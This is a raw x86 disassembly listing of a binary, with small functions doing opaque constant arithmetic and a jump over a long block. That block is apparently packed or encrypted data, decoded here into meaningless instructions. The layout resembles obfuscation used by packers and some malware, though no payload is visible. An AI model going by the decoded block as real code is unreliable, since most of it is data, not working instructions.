  41143e:	mov    DWORD PTR [ebp-0x3c],0x4177
  411445:	mov    DWORD PTR [ebp+0x8],0x1405
  41144c:	mov    eax,DWORD PTR [ebp+0x8]
  41144f:	mov    ecx,DWORD PTR [ebp-0x3c]
  411452:	imul   eax,eax,0x58cc
  411458:	add    eax,0x3f39
  41145d:	and    eax,ecx
  41145f:	add    eax,0x3b90
  411464:	or     eax,0x4b1c
  411469:	sub    eax,0x7fdd
  41146e:	leave  
  41146f:	ret    0x4
  411472:	push   ebp
  411473:	mov    ebp,esp
  411475:	and    esp,0xfffffff8
  411478:	sub    esp,0x20
  41147b:	push   ebx
  41147c:	push   esi
  41147d:	lea    eax,[esp+0x10]
  411481:	mov    DWORD PTR [esp+0xc],eax
  411485:	mov    eax,DWORD PTR [esp+0xc]
  411489:	mov    ecx,DWORD PTR [esp+0x10]
  41148d:	mov    edx,DWORD PTR [esp+0x14]
  411491:	sub    DWORD PTR [eax],ecx
  411493:	sbb    DWORD PTR [eax+0x4],edx
  411496:	mov    eax,DWORD PTR [esp+0xc]
  41149a:	or     DWORD PTR [eax],0xcb7db576
  4114a0:	or     DWORD PTR [eax+0x4],0x9c2b8ae8
  4114a7:	lea    eax,[esp+0x18]
  4114ab:	jmp    0x41183a
  4114b0:	test   al,0x7c
  4114b2:	or     BYTE PTR [esp+ebx*1-0x44],ch
  4114b6:	lods   al,BYTE PTR ds:[esi]
  4114b7:	mov    esp,0x92465201
  4114bc:	retf   
  4114bd:	jg     0x411503
  4114bf:	fst    st(4)
  4114c1:	push   esp
  4114c2:	mov    esi,0xbec499be
  4114c7:	mov    esi,0x8ad4ef1e
  4114cc:	in     al,0xa8
  4114ce:	das    
  4114cf:	out    dx,al
  4114d0:	and    al,0x99
  4114d2:	loop   0x411520
  4114d4:	inc    esi
  4114d5:	xor    al,0xf8
  4114d7:	outs   dx,BYTE PTR ds:[esi]
  4114d8:	xor    DWORD PTR [ebx],0xffffff9a
  4114db:	sbb    BYTE PTR ds:[edi+esi*8+0x25fc78d2],dl
  4114e3:	data16 stc 
  4114e5:	and    BYTE PTR [esi-0x16933f96],ah
  4114eb:	out    dx,eax
  4114ec:	sahf   
  4114ed:	jne    0x41156a
  4114ef:	scas   eax,DWORD PTR es:[edi]
  4114f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114f1:	lds    ebp,FWORD PTR [ecx+0x5d807d9]
  4114f7:	out    0x1e,al
  4114f9:	dec    edi
  4114fa:	push   es
  4114fb:	pop    esi
  4114fc:	mov    al,ds:0x3b2c32b5
  411501:	pop    ecx
  411502:	repnz dec ebx
  411504:	je     0x41154e
  411506:	out    0x8c,al
  411508:	or     bl,dh
  41150a:	jge    0x411578
  41150c:	fcomip st,st(1)
  41150e:	imul   edi,ebx,0x47b6bb80
  411514:	loop   0x4114f4
  411516:	dec    ebx
  411517:	es dec eax
  411519:	adc    BYTE PTR [edi+0x1f5d6870],ch
  41151f:	pop    esp
  411520:	pusha  
  411521:	push   ds
  411522:	and    eax,0xf0e73bb3
  411527:	cli    
  411528:	inc    edi
  411529:	scas   eax,DWORD PTR es:[edi]
  41152a:	fsub   QWORD PTR [eax-0x6b147a7e]
  411530:	scas   eax,DWORD PTR es:[edi]
  411531:	adc    ebp,DWORD PTR [edx-0x4b]
  411534:	mov    ah,0x5a
  411537:	dec    ebx
  411538:	gs dec eax
  41153a:	gs xchg ah,cl
  41153d:	lds    eax,FWORD PTR [ebx+edi*2-0x4e383050]
  411544:	cmp    al,0x71
  411546:	mov    ecx,esi
  411548:	jle    0x4114fb
  41154a:	and    DWORD PTR [esp+eax*4-0x63909334],edx
  411551:	jmp    0x4114d3
  411553:	stos   BYTE PTR es:[edi],al
  411554:	imul   esp,DWORD PTR [esi-0x19dc8ce],0xe469c611
  41155e:	inc    eax
  41155f:	adc    cl,BYTE PTR [ebx+eiz*2+0x63d6a10]
  411566:	inc    ebp
  411567:	pop    esi
  411568:	xor    eax,0xc29c2606
  41156d:	scas   eax,DWORD PTR es:[edi]
  41156e:	pop    ecx
  41156f:	or     edi,DWORD PTR [ebx]
  411571:	dec    ecx
  411572:	clc    
  411573:	pop    ebx
  411574:	adc    bl,BYTE PTR [ebx+0x5e]
  411577:	ins    BYTE PTR es:[edi],dx
  411578:	xchg   esi,eax
  411579:	add    ch,dl
  41157b:	popf   
  41157c:	jl     0x41157e
  41157e:	fnstsw WORD PTR [eax]
  411580:	sub    al,dh
  411582:	cmp    BYTE PTR [edx],0xdc
  411585:	push   ecx
  411586:	shr    BYTE PTR [ecx+0x22],0xb7
  41158a:	jl     0x4115fb
  41158c:	call   0x4d7c:0x3128f2d2
  411593:	repz xor al,BYTE PTR [edx-0x3da3ddbc]
  41159a:	mov    WORD PTR [ecx-0x4ee60850],fs
  4115a0:	pop    eax
  4115a1:	add    DWORD PTR ds:0x3ead778b,ebp
  4115a7:	aas    
  4115a8:	lds    esp,FWORD PTR [edi-0x72]
  4115ab:	sub    DWORD PTR [esi],esp
  4115ad:	ja     0x411552
  4115af:	je     0x4115af
  4115b1:	pusha  
  4115b2:	dec    esp
  4115b3:	add    eax,esp
  4115b5:	stc    
  4115b6:	push   edi
  4115b7:	push   ecx
  4115b8:	pop    es
  4115b9:	aam    0xfc
  4115bb:	push   cs
  4115bc:	inc    ecx
  4115bd:	inc    edi
  4115be:	push   esi
  4115bf:	push   ds
  4115c0:	adc    al,0xd5
  4115c2:	push   esp
  4115c3:	bnd js 0x4115ea
  4115c6:	out    dx,eax
  4115c7:	inc    esp
  4115c8:	xchg   esp,eax
  4115c9:	or     edx,ebx
  4115cb:	mov    edx,0x2075865d
  4115d0:	jns    0x411601
  4115d2:	dec    ebx
  4115d3:	mov    eax,ds:0x86bff5dd
  4115d8:	sbb    DWORD PTR [edx],esi
  4115da:	pop    es
  4115db:	pop    ebx
  4115dc:	iret   
  4115dd:	rcl    BYTE PTR [edx+edx*4+0x39],0x2e
  4115e2:	cli    
  4115e3:	ret    
  4115e4:	fnsave [esi+0x1e]
  4115e7:	(bad)  
  4115e9:	or     BYTE PTR [edx+0x61],ah
  4115ec:	mov    dh,0x47
  4115ee:	inc    ebp
  4115ef:	cmc    
  4115f0:	ficomp DWORD PTR [ebx-0xcd9d24e]
  4115f6:	not    ch
  4115f8:	les    ecx,FWORD PTR [edi-0x67]
  4115fb:	mov    bh,0x83
  4115fd:	inc    ebx
  4115fe:	mov    ebx,0x92e4efcd
  411603:	jo     0x41160f
  411605:	and    edi,DWORD PTR [ecx]
  411607:	cwde   
  411608:	mov    cl,0xc4
  41160a:	aaa    
  41160b:	hlt    
  41160c:	mov    eax,0x53ef2979
  411611:	jno    0x4115b4
  411613:	loopne 0x411676
  411615:	mov    WORD PTR [edx-0x50],?
  411618:	mov    dh,0xb7
  41161a:	icebp  
  41161b:	xlat   BYTE PTR ds:[ebx]
  41161c:	and    BYTE PTR [ebx],ch
  41161e:	mov    BYTE PTR [eax],0xbd
  411621:	nop
  411622:	mov    ss,ecx
  411624:	inc    esp
  411625:	xor    DWORD PTR [eax+edx*8],edi
  411628:	out    dx,eax
  411629:	(bad)  
  41162a:	sub    BYTE PTR [edx-0x602241b1],bh
  411630:	pop    edx
  411631:	jmp    0x63ee6695
  411636:	jnp    0x4115d1
  411638:	inc    ebx
  411639:	inc    esp
  41163a:	sub    ebx,DWORD PTR [edx+0xe]
  41163d:	push   ss
  41163e:	jmp    0x411638
  411640:	(bad)  
  411641:	repnz sub ebx,DWORD PTR [edx-0x3ded57d0]
  411648:	cld    
  411649:	mov    ecx,0xe6710190
  41164e:	mov    eax,ds:0xadd318d5
  411653:	pop    edi
  411654:	(bad)  [esp+0x5f79d6ea]
  41165b:	pop    ss
  41165c:	mov    eax,ds:0xf371bf67
  411661:	cmp    al,0xdc
  411663:	ins    BYTE PTR es:[edi],dx
  411664:	jmp    0xe54b:0x6768fc1a
  41166b:	in     eax,0xde
  41166d:	xchg   esi,eax
  41166e:	push   cs
  41166f:	inc    ebx
  411670:	add    al,0xf7
  411672:	mov    ds:0x76ca7c04,eax
  411677:	cs xor ebp,ecx
  41167a:	imul   eax,DWORD PTR [edx+0x5d],0xf688cda7
  411681:	push   ecx
  411682:	in     eax,0x8b
  411684:	xchg   edx,eax
  411685:	add    DWORD PTR [ebp+eax*4+0x30],0x15
  41168a:	pop    ebx
  41168b:	icebp  
  41168c:	aaa    
  41168d:	ret    0x3ec5
  411690:	out    0x43,al
  411692:	sub    dl,al
  411694:	sti    
  411695:	add    al,0x1e
  411697:	inc    esp
  411698:	(bad)  
  411699:	cmp    bh,dh
  41169b:	or     edi,edx
  41169d:	setne  bl
  4116a0:	arpl   ax,cx
  4116a2:	retf   0x5e76
  4116a5:	fistp  DWORD PTR [eax+edi*4-0x66f972f2]
  4116ac:	stc    
  4116ad:	retf   0x2a55
  4116b0:	add    DWORD PTR [edi-0x66],ebp
  4116b3:	push   cs
  4116b4:	inc    edi
  4116b5:	pop    edx
  4116b6:	bound  esi,QWORD PTR [esp+ecx*4-0x60b393d4]
  4116bd:	sbb    bh,BYTE PTR [eax]
  4116bf:	jge    0x4116d8
  4116c1:	retf   0xef76
  4116c4:	mov    ah,0xac
  4116c6:	adc    cl,BYTE PTR [edx]
  4116c8:	sar    BYTE PTR [eax+0x7f],1
  4116cb:	popa   
  4116cc:	into   
  4116cd:	mov    ds,WORD PTR [ecx+0x22]
  4116d0:	adc    eax,DWORD PTR [edi+0x76fa0ef]
  4116d6:	mov    bl,0xca
  4116d8:	xchg   ebx,eax
  4116d9:	push   0x15f9ba93
  4116de:	and    DWORD PTR [esi-0xc],eax
  4116e1:	dec    esi
  4116e2:	stos   DWORD PTR es:[edi],eax
  4116e3:	push   eax
  4116e4:	fs enter 0x8c22,0xdb
  4116e9:	push   ecx
  4116ea:	out    dx,al
  4116eb:	xchg   esi,eax
  4116ec:	sar    DWORD PTR [edi-0x5],1
  4116ef:	popa   
  4116f0:	mov    al,ds:0xec531003
  4116f5:	pop    ebx
  4116f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116f7:	clc    
  4116f8:	popf   
  4116f9:	rcr    BYTE PTR ss:[edi],1
  4116fc:	inc    ebp
  4116fd:	jns    0x411683
  4116ff:	lods   eax,DWORD PTR ds:[esi]
  411700:	jmp    FWORD PTR [esi+0x30cc0f95]
  411706:	ud2    
  411708:	cdq    
  411709:	out    0x32,al
  41170b:	add    eax,0x3b49614f
  411710:	jp     0x4116a4
  411712:	gs sbb ebp,0xbd7f43b5
  411719:	jl     0x4116f9
  41171b:	adc    al,0x4f
  41171d:	das    
  41171e:	fdivr  st(6),st
  411720:	fdiv   DWORD PTR ds:0xa2f5f9cf
  411726:	shl    BYTE PTR [edi+eiz*1-0x630274d3],0x6c
  41172e:	in     eax,dx
  41172f:	imul   edi,DWORD PTR [eax],0xffffffb3
  411732:	or     BYTE PTR [edi+0xe],dh
  411735:	xchg   ebp,eax
  411736:	mov    ah,ch
  411738:	out    0x63,eax
  41173a:	sbb    BYTE PTR [ecx+0x2e],0xba
  41173e:	lock dec ebx
  411740:	mov    bl,0xa4
  411742:	cmp    ecx,DWORD PTR [ecx+0x367a31c2]
  411748:	stos   DWORD PTR es:[edi],eax
  411749:	pop    es
  41174a:	mov    dl,0xd3
  41174c:	shl    bh,1
  41174e:	js     0x4117cc
  411750:	stc    
  411751:	cli    
  411752:	arpl   WORD PTR [esi+0x1e512293],ax
  411758:	rol    BYTE PTR [ebx],0x59
  41175b:	rol    bl,1
  41175d:	iret   
  41175e:	mov    al,ds:0x14ab1137
  411763:	rol    BYTE PTR [esi-0x43b64f30],1
  411769:	mov    cl,BYTE PTR [ecx-0x46]
  41176c:	cmp    BYTE PTR [edi],0x75
  41176f:	or     dh,BYTE PTR [esi]
  411771:	mov    al,ds:0xf120af7
  411776:	(bad)  
  411777:	rcl    DWORD PTR [esi-0x27cc2cc4],cl
  41177d:	push   0x23
  41177f:	pop    ebx
  411780:	adc    DWORD PTR [edx],esi
  411782:	jnp    0x411761
  411784:	push   ecx
  411785:	test   eax,0xa80f9831
  41178a:	lds    esi,FWORD PTR [ebx-0x1e]
  41178d:	clc    
  41178e:	test   eax,0xabfc04ad
  411793:	addr16 aam 0x4d
  411796:	mov    bh,0xea
  411798:	mov    bh,0xae
  41179a:	or     eax,0x94eed95
  41179f:	mov    ch,0x50
  4117a1:	imul   esi,ebx,0x46
  4117a4:	jp     0x411792
  4117a6:	test   al,0x69
  4117a8:	imul   ebx,DWORD PTR [edi+edx*8-0x65],0x47
  4117ad:	leave  
  4117ae:	cmp    bh,ah
  4117b0:	into   
  4117b1:	mov    bh,0xe
  4117b3:	stos   DWORD PTR es:[edi],eax
  4117b4:	fistp  WORD PTR [ecx]
  4117b6:	ins    DWORD PTR es:[edi],dx
  4117b7:	sbb    eax,0x52e314ca
  4117bd:	gs loopne 0x4117f4
  4117c0:	dec    ebp
  4117c1:	sub    ch,BYTE PTR [edx]
  4117c3:	mov    ?,WORD PTR [ebp+eiz*4+0x392f87dd]
  4117ca:	(bad)  
  4117cb:	sar    cl,cl
  4117cd:	outs   dx,DWORD PTR ds:[esi]
  4117ce:	mov    dh,0x27
  4117d0:	popf   
  4117d1:	mov    edx,DWORD PTR [ecx+esi*8+0x15]
  4117d5:	mov    DWORD PTR [ebx+edi*4+0x36af7f53],ebx
  4117dc:	retf   
  4117dd:	addr16 pminsw mm5,mm7
  4117e1:	push   0x591183b2
  4117e6:	ja     0x4117a9
  4117e8:	test   al,0x9
  4117ea:	repz push ecx
  4117ec:	push   edi
  4117ed:	fcomp  DWORD PTR [ecx-0x7ece6e65]
  4117f3:	gs pop ss
  4117f5:	(bad)  
  4117f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117f7:	fwait
  4117f8:	mov    al,0xc0
  4117fa:	ds fs jnp 0x4117cc
  4117fe:	adc    eax,0xed06e23b
  411803:	xchg   ecx,eax
  411804:	jmp    FWORD PTR [ecx-0x2b]
  411807:	add    bl,BYTE PTR [ebp+0x1a]
  41180a:	or     DWORD PTR [ebp+0x3d],esp
  41180d:	ins    BYTE PTR es:[edi],dx
  41180e:	jmp    0x99b3:0x949ca2bf
  411815:	sbb    al,0x59
  411817:	mov    dh,0x68
  411819:	lahf   
  41181a:	loop   0x411806
  41181c:	pop    edx
  41181d:	mov    edi,0x72ad041a
  411822:	cwde   
  411823:	and    eax,0xa9ea8a04
  411828:	es push cs
  41182a:	sub    dl,dl
  41182c:	inc    esp
  41182d:	popf   
  41182e:	out    0x79,al
  411830:	pop    es
  411831:	xor    esp,eax
  411833:	std    
  411834:	pusha  
  411835:	sti    
  411836:	fnstcw WORD PTR [edi-0x67]
  411839:	int3   
  41183a:	push   eax
  41183b:	jmp    0x411bca
  411840:	xlat   BYTE PTR ds:[ebx]
  411841:	xchg   ebx,eax
  411842:	push   edx
  411843:	call   FWORD PTR [edx-0x30636400]
  411849:	fist   WORD PTR [eax-0xdc37e70]
  41184f:	iret   
  411850:	scas   eax,DWORD PTR es:[edi]
  411851:	pop    edx
  411852:	mov    esi,0xbec499be
  411857:	mov    esi,0xc3958105
  41185c:	sub    bl,ch
  41185e:	pop    ds
  41185f:	je     0x4118b8
  411861:	xchg   ebp,eax
  411862:	sub    ecx,eax
  411864:	xchg   edx,eax
  411865:	or     al,0x26
  411867:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411868:	loop   0x411816
  41186a:	lahf   
  41186b:	in     eax,dx
  41186c:	jnp    0x411847
  41186e:	sbb    DWORD PTR [esi+0x24],ecx
  411871:	js     0x41184f
  411873:	add    al,0x6a
  411875:	addr16 pop ebp
  411877:	or     bl,BYTE PTR [eax]
  411879:	arpl   WORD PTR [ebp+0x6a],cx
  41187c:	and    edx,edi
  41187e:	mov    al,0x5
  411880:	sahf   
  411881:	fs pusha 
  411883:	xchg   ecx,eax
  411884:	dec    ebp
  411885:	in     al,dx
  411886:	outs   dx,DWORD PTR ds:[esi]
  411887:	mov    edi,edi
  411889:	sub    eax,0x8faa3178
  41188e:	mov    bl,0x5c
  411890:	popa   
  411891:	and    DWORD PTR [ecx-0x3aa4d5da],0x7f528688
  41189b:	xchg   esp,eax
  41189c:	push   es
  41189d:	fidiv  DWORD PTR [esi]
  41189f:	xor    ecx,esp
  4118a1:	in     al,0x6b
  4118a3:	sub    DWORD PTR [eax],eax
  4118a5:	hlt    
  4118a6:	iret   
  4118a7:	test   edi,eax
  4118a9:	mov    ebx,0x2e146e99
  4118ae:	mov    ebp,0xd378f336
  4118b3:	cli    
  4118b4:	in     eax,0x93
  4118b6:	jmp    0x55538f67
  4118bb:	pop    eax
  4118bc:	jecxz  0x411870
  4118be:	dec    esp
  4118bf:	bound  ebp,QWORD PTR [edx+0x63]
  4118c2:	iret   
  4118c3:	popf   
  4118c4:	loope  0x41186c
  4118c6:	or     DWORD PTR [ebx],esi
  4118c8:	in     eax,dx
  4118c9:	rcl    DWORD PTR [eax],0x9c
  4118cc:	adc    BYTE PTR [ebp+0x78b5ec44],ch
  4118d2:	add    al,0x17
  4118d4:	into   
  4118d5:	jg     0x4118ca
  4118d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118d8:	fcom   st(4)
  4118da:	aad    0xd7
  4118dc:	lds    esi,FWORD PTR [ebx+eax*2]
  4118df:	adc    edx,DWORD PTR [edx]
  4118e1:	das    
  4118e2:	pop    ss
  4118e3:	lahf   
  4118e4:	in     al,0x5c
  4118e6:	mov    esi,0x404ee45e
  4118eb:	mov    edx,0x7268778e
  4118f0:	jl     0x41187f
  4118f2:	int    0x73
  4118f4:	pop    ecx
  4118f5:	jmp    0x903c:0xdc11a56f
  4118fc:	adc    ebp,DWORD PTR [eax]
  4118fe:	(bad)  
  4118ff:	push   esi
  411900:	inc    ebx
  411901:	in     eax,0x76
  411903:	rol    DWORD PTR [eax-0x4c4ba6ea],cl
  411909:	mov    ds:0x1a73ff2c,eax
  41190e:	out    dx,al
  41190f:	das    
  411910:	push   ecx
  411911:	mov    esp,0xdbdf4c56
  411916:	in     al,dx
  411917:	pop    edi
  411918:	loop   0x411965
  41191a:	aad    0x60
  41191c:	mov    WORD PTR [edx-0x4f],ss
  41191f:	sub    dh,BYTE PTR [edx+0x4510418c]
  411925:	sub    ebx,esp
  411927:	lahf   
  411928:	rol    BYTE PTR [ecx],1
  41192a:	bound  esi,QWORD PTR [ebx-0x43534a03]
  411930:	mov    esp,0xefb53b45
  411935:	jle    0x411924
  411937:	add    eax,0xa633236c
  41193c:	outs   dx,DWORD PTR ds:[esi]
  41193d:	cmp    al,BYTE PTR [ebx+edx*1]
  411940:	mov    ds:0x31bf34ff,eax
  411945:	popf   
  411946:	mov    esi,0xcfff18aa
  41194b:	mov    edx,0x8b021aaa
  411950:	imul   ebp,ebx,0x1ed8e9f0
  411956:	mov    ebp,0xc50fffc2
  41195b:	sbb    BYTE PTR [ecx],bh
  41195d:	add    eax,0x9723a361
  411962:	rcr    DWORD PTR [esi-0x1e391],1
  411968:	xlat   BYTE PTR ds:[ebx]
  411969:	xchg   ebp,eax
  41196a:	sbb    al,0x47
  41196c:	jo     0x411990
  41196e:	mov    al,ds:0x35702608
  411973:	shl    DWORD PTR [ebx-0xed41c55],0x88
  41197a:	aam    0xfb
  41197c:	sub    DWORD PTR [esi-0x1bdb9ad5],0xffffffef
  411983:	addr16 ja 0x4119a4
  411986:	not    BYTE PTR [ebx+0x5f]
  411989:	mov    edi,0x238ddf20
  41198e:	test   BYTE PTR [edx+0x5d0d0a3b],0xfe
  411995:	sub    ebx,eax
  411997:	js     0x41196d
  411999:	mov    al,0x5d
  41199b:	mov    ebx,0x96229ea3
  4119a0:	mov    esp,0x3f5d700d
  4119a5:	inc    ebx
  4119a6:	(bad)  
  4119a8:	push   ecx
  4119a9:	and    BYTE PTR [ecx-0x1188cfa1],bl
  4119af:	outs   dx,DWORD PTR cs:[esi]
  4119b1:	pop    edx
  4119b2:	pusha  
  4119b3:	add    eax,0xb24a2a85
  4119b8:	mov    ah,0x26
  4119ba:	or     al,0x76
  4119bc:	dec    eax
  4119bd:	fstp   TBYTE PTR ds:0x9d106b1b
  4119c3:	sbb    BYTE PTR [ebx-0x217da3ea],bh
  4119c9:	adc    al,0x21
  4119cb:	rcl    esi,0xc3
  4119ce:	mov    ch,0x65
  4119d0:	push   ss
  4119d1:	(bad)  
  4119d2:	stos   BYTE PTR es:[edi],al
  4119d3:	mov    edx,DWORD PTR [edx]
  4119d5:	out    dx,eax
  4119d6:	dec    edi
  4119d7:	mov    eax,ds:0x3468d02
  4119dc:	and    BYTE PTR [ebx],ah
  4119de:	aaa    
  4119df:	call   0xa367b6c8
  4119e4:	test   eax,0xd5c824f9
  4119e9:	adc    dh,ch
  4119eb:	inc    eax
  4119ec:	mov    DWORD PTR [ebx+0x38],ebp
  4119ef:	mov    DWORD PTR ds:0x90927e4b,edi
  4119f5:	xchg   ecx,eax
  4119f6:	jl     0x411984
  4119f8:	in     eax,0xd3
  4119fa:	push   esp
  4119fb:	cmc    
  4119fc:	dec    eax
  4119fd:	xor    DWORD PTR [esi+0x1f],ebx
  411a00:	inc    eax
  411a01:	or     ecx,DWORD PTR ds:0x4aab6998
  411a07:	mov    esi,0x161bbcb4
  411a0c:	scas   eax,DWORD PTR es:[edi]
  411a0d:	imul   ecx,DWORD PTR [edi-0x7b],0x79
  411a11:	lods   eax,DWORD PTR es:[esi]
  411a13:	mov    ebp,0x74e0d76e
  411a18:	out    0x53,eax
  411a1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a1b:	mov    bh,0x9a
  411a1d:	pop    edx
  411a1e:	push   ebp
  411a1f:	dec    edx
  411a20:	rol    BYTE PTR [ecx+0x7d39edf9],1
  411a26:	push   ss
  411a27:	add    eax,0x960099de
  411a2c:	stc    
  411a2d:	mov    edx,0xee9d7d86
  411a32:	dec    ebx
  411a33:	cmc    
  411a34:	and    ecx,edx
  411a36:	mov    cs,WORD PTR [edx-0x39e7d58f]
  411a3c:	scas   eax,DWORD PTR es:[edi]
  411a3d:	xor    al,0x68
  411a3f:	pop    ecx
  411a40:	inc    ebx
  411a41:	mov    al,0xa5
  411a43:	popa   
  411a44:	mov    ecx,ebp
  411a46:	push   ss
  411a47:	inc    ecx
  411a48:	inc    edi
  411a49:	outs   dx,BYTE PTR ds:[esi]
  411a4a:	in     al,0x66
  411a4c:	mov    edi,0x169a91ff
  411a51:	out    0x9e,al
  411a53:	(bad)  
  411a54:	pusha  
  411a55:	mov    cs,WORD PTR [ebp+0x22]
  411a58:	cli    
  411a59:	fiadd  DWORD PTR [ecx]
  411a5b:	nop
  411a5c:	jb     0x411a74
  411a5e:	sub    WORD PTR [ebp-0x3b],si
  411a62:	(bad)  
  411a63:	int    0x59
  411a65:	inc    esi
  411a66:	lds    edx,FWORD PTR [ebx]
  411a68:	dec    eax
  411a69:	out    dx,al
  411a6a:	nop
  411a6b:	test   BYTE PTR [esp+ecx*2-0x1d],bh
  411a6f:	or     esp,DWORD PTR [eax+0x4e6afcbb]
  411a75:	shl    DWORD PTR [edx-0x6f],0x7b
  411a79:	adc    DWORD PTR [edx-0xb],ecx
  411a7c:	jnp    0x411a25
  411a7e:	enter  0x7da1,0x1b
  411a82:	jle    0x411a32
  411a84:	fwait
  411a85:	push   cs
  411a86:	pop    ss
  411a87:	mov    bl,0x5c
  411a89:	aas    
  411a8a:	inc    esi
  411a8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a8c:	pop    esi
  411a8d:	pop    ss
  411a8e:	jle    0x411ab8
  411a90:	add    eax,DWORD PTR ds:0x289fcd1b
  411a96:	(bad)  
  411a97:	cs jmp 0xf3b825fc
  411a9d:	push   ecx
  411a9e:	icebp  
  411a9f:	test   BYTE PTR [ecx-0x47],al
  411aa2:	push   ss
  411aa3:	fsubr  QWORD PTR es:[ebx+ebx*1-0x47]
  411aa8:	mov    edx,0xaaa1644b
  411aad:	xchg   esi,eax
  411aae:	enter  0xb77c,0x20
  411ab2:	sub    edx,edi
  411ab4:	mov    al,ds:0x727528f8
  411ab9:	dec    ecx
  411aba:	loope  0x411b31
  411abc:	push   cs
  411abd:	lds    esi,FWORD PTR [edi+ebp*8]
  411ac0:	xchg   DWORD PTR [eax+0x767e403e],edx
  411ac6:	jo     0x411b2b
  411ac8:	push   edx
  411ac9:	and    ebx,DWORD PTR [ecx+0x2dcf11f5]
  411acf:	push   ebx
  411ad0:	(bad)  
  411ad1:	cmp    BYTE PTR [edx],ch
  411ad3:	push   ss
  411ad4:	sub    ebp,DWORD PTR [ebp+0x3768a65c]
  411ada:	or     al,bl
  411adc:	xchg   ebx,eax
  411add:	enter  0x6896,0xcd
  411ae1:	sub    DWORD PTR [edi+edx*8+0x3c3b4a46],ebx
  411ae8:	and    eax,0xc6a6453b
  411aed:	jp     0x411b4f
  411aef:	out    0x45,eax
  411af1:	test   BYTE PTR [eax],0x61
  411af4:	pop    ds
  411af5:	ret    
  411af6:	lock mov eax,ds:0xc6dc8891
  411afc:	mov    ecx,ds
  411afe:	sub    ecx,ebp
  411b00:	call   0x2a36ca3d
  411b05:	mov    cl,0x38
  411b07:	cmp    ebp,edx
  411b09:	jne    0x411b20
  411b0b:	loope  0x411aa3
  411b0d:	mov    bh,0x85
  411b0f:	jl     0x411abd
  411b11:	mov    cl,0x6f
  411b13:	jge    0x411b88
  411b15:	fnsave [ebp+0x18]
  411b18:	cwde   
  411b19:	ret    0x9556
  411b1c:	jmp    0xcacdf861
  411b21:	sub    esi,DWORD PTR [edx-0x745b73af]
  411b27:	xlat   BYTE PTR ds:[ebx]
  411b28:	fistp  WORD PTR ds:0xab2c3aa8
  411b2e:	push   es
  411b2f:	popf   
  411b30:	push   cs
  411b31:	in     al,dx
  411b32:	push   ecx
  411b33:	mov    cl,0x59
  411b35:	mov    ch,0xcb
  411b37:	cmp    edi,0xce9ba811
  411b3d:	xchg   esp,eax
  411b3e:	jg     0x411bbe
  411b40:	and    al,0x49
  411b42:	adc    dl,BYTE PTR [ebx+0x10]
  411b45:	pop    esi
  411b46:	mov    edi,0x12b99266
  411b4b:	push   esi
  411b4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b4d:	push   ecx
  411b4e:	adc    ch,BYTE PTR [eax]
  411b50:	and    BYTE PTR [ebp-0x75],dh
  411b53:	pop    esi
  411b54:	mov    cs,WORD PTR [eax+0x3f]
  411b57:	ret    0xfcdd
  411b5a:	ret    
  411b5b:	adc    al,0x84
  411b5d:	mov    dl,0x4e
  411b5f:	clc    
  411b60:	push   edi
  411b61:	nop
  411b62:	push   eax
  411b63:	xchg   ebx,eax
  411b64:	mov    edx,db0
  411b67:	mov    ch,0x1e
  411b69:	adc    eax,0x3ac494af
  411b6e:	fucomip st,st(4)
  411b70:	adc    eax,0xa488ad48
  411b75:	shl    BYTE PTR [ecx-0x98852ce],0x4c
  411b7c:	adc    dl,bh
  411b7e:	(bad)  [ecx+eax*4-0x5c]
  411b82:	xchg   ecx,eax
  411b83:	inc    esp
  411b84:	out    dx,al
  411b85:	aas    
  411b86:	cmp    al,0x4b
  411b88:	shr    DWORD PTR [ecx+eax*2],cl
  411b8b:	lea    ebp,[ecx]
  411b8d:	push   esp
  411b8e:	and    eax,0x26448bcb
  411b93:	daa    
  411b94:	fist   DWORD PTR [esi+0x1b]
  411b97:	sub    bh,BYTE PTR [ecx+0x38e088c8]
  411b9d:	push   ecx
  411b9e:	call   0x4e2c50f4
  411ba3:	hlt    
  411ba4:	leave  
  411ba5:	mov    ah,al
  411ba7:	cdq    
  411ba8:	xchg   ebp,eax
  411ba9:	lahf   
  411baa:	loopne 0x411c07
  411bac:	out    dx,eax
  411bad:	adc    BYTE PTR [esi-0x2d],0x49
  411bb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bb2:	push   0xffffff83
  411bb4:	sbb    ebx,DWORD PTR [ecx-0x7e6f54c2]
  411bba:	loope  0x411c19
  411bbc:	sub    BYTE PTR [eax-0x458cff41],al
  411bc2:	xor    ch,BYTE PTR [edx]
  411bc4:	mov    ah,0x98
  411bc6:	rcr    ecx,1
  411bc8:	xor    BYTE PTR [ebx+0x2424448d],0x50
  411bcf:	call   0x40f1e1
  411bd4:	mov    eax,DWORD PTR [esp+0x18]
  411bd8:	mov    ecx,DWORD PTR [esp+0x1c]
  411bdc:	push   DWORD PTR [ebp+0x18]
  411bdf:	mov    ebx,DWORD PTR [ebp+0xc]
  411be2:	push   DWORD PTR [ebp+0x14]
  411be5:	mov    esi,DWORD PTR [ebp+0x8]
  411be8:	push   DWORD PTR [ebp+0x10]
  411beb:	push   DWORD PTR [esp+0x20]
  411bef:	push   DWORD PTR [esp+0x20]
  411bf3:	push   DWORD PTR [esp+0x38]
  411bf7:	push   DWORD PTR [esp+0x38]
  411bfb:	call   0x401000
  411c00:	pop    esi
  411c01:	pop    ebx
  411c02:	mov    esp,ebp
  411c04:	pop    ebp
  411c05:	ret    0x14
  411c08:	push   ebp
  411c09:	mov    ebp,esp
  411c0b:	sub    esp,0x30
  411c0e:	mov    DWORD PTR [ebp-0x24],0x7c16
  411c15:	mov    DWORD PTR [ebp-0x20],0x53bd
  411c1c:	mov    DWORD PTR [ebp-0x18],0x3bd5
  411c23:	mov    DWORD PTR [ebp-0x1c],0x6ab6
  411c2a:	mov    DWORD PTR [ebp-0xc],0x4b9d
  411c31:	mov    DWORD PTR [ebp-0x8],0x7e48
  411c38:	mov    DWORD PTR [ebp-0x4],0x604b
  411c3f:	mov    DWORD PTR [ebp-0x30],0x5b69
  411c46:	mov    DWORD PTR [ebp-0x2c],0x4521
